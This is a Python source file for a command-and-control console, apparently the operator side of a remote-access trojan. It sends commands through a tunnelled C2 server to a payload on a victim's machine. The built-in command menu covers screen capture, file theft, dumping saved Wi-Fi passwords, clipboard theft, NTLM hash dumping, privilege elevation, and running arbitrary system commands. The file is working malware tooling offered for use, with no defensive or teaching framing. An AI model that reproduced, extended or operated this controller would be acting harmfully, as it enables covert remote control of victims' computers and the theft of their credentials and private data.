#!/usr/bin/env python3
import requests
import json
import sys
import os
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.styles import Style

# CHANGE THIS TO YOUR NGROK URL
C2_URL = "<URL>"

def send_command(cmd):
    """Send a command to the C2 server."""
    try:
        resp = requests.post(
            f"{C2_URL}/command",
            json={"command": cmd},
            timeout=5
        )
        if resp.status_code == 200:
            print(f"[+] Command sent: {cmd}")
        else:
            print(f"[-] Error: {resp.text}")
    except requests.exceptions.ConnectionError:
        print("[-] Connection error: C2 server not reachable")
    except requests.exceptions.Timeout:
        print("[-] Timeout: C2 server not responding")
    except Exception as e:
        print(f"[-] Failed to send command: {e}")

def get_command_history():
    """Load command history from file."""
    history_file = ".c2_history"
    if not os.path.exists(history_file):
        with open(history_file, 'w') as f:
            pass
    return FileHistory(history_file)

def main():
    # Custom style for prompt
    style = Style.from_dict({
        'prompt': 'bold fg:ansigreen',
    })
    
    print("=" * 50)
    print("  EXPERT C2 CONTROLLER")
    print("=" * 50)
    print("\nAvailable Commands:")
    print("  screenshot     - Capture victim's screen")
    print("  upload <path>  - Upload a file from victim")
    print("  wifi           - Get saved Wi-Fi passwords")
    print("  clipboard      - Get clipboard content")
    print("  dumphashes     - Dump NTLM hashes (requires Admin)")
    print("  elevate        - Request Admin privileges")
    print("  exit           - Kill the payload")
    print("  <any cmd>      - Run any system command")
    print("-" * 50)
    print("\n[✓] Arrow keys work!")
    print("[✓] Up/Down for command history")
    print("[✓] Tab for auto-completion")
    print("[✓] Ctrl+C to exit\n")
    
    # Command completion list
    command_completer = WordCompleter([
        'screenshot', 'upload', 'wifi', 'clipboard', 
        'dumphashes', 'elevate', 'exit', 'help'
    ], ignore_case=True)
    
    # Key bindings
    bindings = KeyBindings()
    
    @bindings.add('c-c')
    def _(event):
        """Ctrl+C to exit."""
        print("\n[+] Exiting...")
        sys.exit(0)
    
    # Main loop
    while True:
        try:
            # Get command with full editing capabilities
            cmd = prompt(
                "C2> ",
                history=get_command_history(),
                auto_suggest=AutoSuggestFromHistory(),
                completer=command_completer,
                complete_while_typing=True,
                key_bindings=bindings,
                style=style
            )
            
            # Strip whitespace
            cmd = cmd.strip()
            
            if not cmd:
                continue
            
            # Handle exit commands
            if cmd.lower() in ["quit", "q", "exit", "exit()"]:
                print("[+] Exiting...")
                break
            
            # Show help
            if cmd.lower() == "help":
                print("\nAvailable Commands:")
                print("  screenshot     - Capture victim's screen")
                print("  upload <path>  - Upload a file from victim")
                print("  wifi           - Get saved Wi-Fi passwords")
                print("  clipboard      - Get clipboard content")
                print("  dumphashes     - Dump NTLM hashes (requires Admin)")
                print("  elevate        - Request Admin privileges")
                print("  exit           - Kill the payload")
                print("  <any cmd>      - Run any system command\n")
                continue
            
            # Send the command
            send_command(cmd)
            
        except KeyboardInterrupt:
            print("\n[+] Exiting...")
            break
        except EOFError:
            print("\n[+] Exiting...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
